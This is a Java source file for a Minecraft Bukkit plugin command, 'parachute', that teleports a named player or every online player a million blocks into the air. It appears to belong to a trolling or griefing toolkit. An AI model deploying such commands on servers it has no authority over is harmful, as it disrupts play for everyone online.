package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.Player;

public class Parachute implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"parachute"};
    }

    @Override
    public String getDescription() {
        return "Teleports all players or a certain player 1 million blocks in the air.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "parachute <*/player>");
            return;
        }

        if (args[0].equals("*")) {
            for (Player p : Bukkit.getOnlinePlayers()) {
                teleportIntoTheSky(p, context.getZ_());
            }

            sender.sendMessage(Colors.Prefix + Colors.Success + "Sent all players into the sky!");
            return;
        }

        Player player = Bukkit.getPlayer(args[0]);
        if (player == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
            return;
        }

        teleportIntoTheSky(player, context.getZ_());
        sender.sendMessage(Colors.Prefix + Colors.Success + "Sent " + player.getName() + " into the sky.");
    }

    private void teleportIntoTheSky(Player p, Z_ z) {
        Bukkit.getScheduler().scheduleSyncDelayedTask(z, () -> {
            Location loc = p.getLocation();
            p.teleport(new Location(p.getWorld(), loc.getX(), loc.getY() + 1000000, loc.getZ()));
        });
    }
}
